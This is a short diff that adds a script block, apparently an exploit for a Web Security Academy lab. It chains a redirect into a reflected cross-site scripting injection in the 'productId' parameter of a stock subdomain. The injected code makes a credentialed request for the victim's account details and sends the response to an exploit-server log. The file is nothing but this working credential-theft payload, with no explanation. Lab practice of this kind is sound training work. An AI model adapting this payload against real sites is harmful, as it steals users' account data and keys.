@@ -1,0 +1,3 @@
+<script>
+    document.location="http://stock.0a2500e30453729985418bd600090094.web-security-academy.net/?productId=2<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a2500e30453729985418bd600090094.web-security-academy.net/accountDetails',true); req.withCredentials = true; req.send(); function reqListener() {location='https://exploit-0a05001f0461725385638acf01c60008.exploit-server.net/log?key='%2bthis.responseText;};%3c/script>&storeId=1"
+</script>
